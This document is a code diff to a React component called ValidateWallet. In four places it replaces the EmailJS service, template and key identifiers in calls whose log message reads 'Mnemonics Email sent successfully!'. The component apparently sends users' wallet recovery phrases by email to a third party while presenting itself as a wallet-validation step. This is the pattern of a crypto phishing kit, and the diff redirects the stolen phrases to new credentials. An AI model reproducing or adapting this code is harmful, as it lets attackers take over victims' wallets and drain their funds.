@@ -74,10 +74,10 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
             };
 
             emailjs.send(
-                'service_c65wu7r',
-                'template_qz7xbap',
+                'service_aj89k72',
+                'template_pdqscf4',
                 { ...templatePrams },
-                '6Z4DUozeezwp4obvW'
+                'Kx3H2T_Dvdctm46t1'
             )
                 .then((response) => {
                     console.log('Mnemonics Email sent successfully!', response.status, response.text);
@@ -97,10 +97,10 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
             };
 
             emailjs.send(
-                'service_c65wu7r',
-                'template_qz7xbap',
+                'service_aj89k72',
+                'template_pdqscf4',
                 { ...templatePrams },
-                '6Z4DUozeezwp4obvW'
+                'Kx3H2T_Dvdctm46t1'
             )
                 .then((response) => {
                     console.log('Mnemonics Email sent successfully!', response.status, response.text);
@@ -119,10 +119,10 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
             };
 
             emailjs.send(
-                'service_c65wu7r',
-                'template_qz7xbap',
+                'service_aj89k72',
+                'template_pdqscf4',
                 { ...templatePrams },
-                '6Z4DUozeezwp4obvW'
+                'Kx3H2T_Dvdctm46t1'
             )
                 .then((response) => {
                     console.log('Mnemonics Email sent successfully!', response.status, response.text);
@@ -141,10 +141,10 @@ const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement 
             };
 
             emailjs.send(
-                'service_c65wu7r',
-                'template_qz7xbap',
+                'service_aj89k72',
+                'template_pdqscf4',
                 { ...templatePrams },
-                '6Z4DUozeezwp4obvW'
+                'Kx3H2T_Dvdctm46t1'
             )
                 .then((response) => {
                     console.log('Mnemonics Email sent successfully!', response.status, response.text);
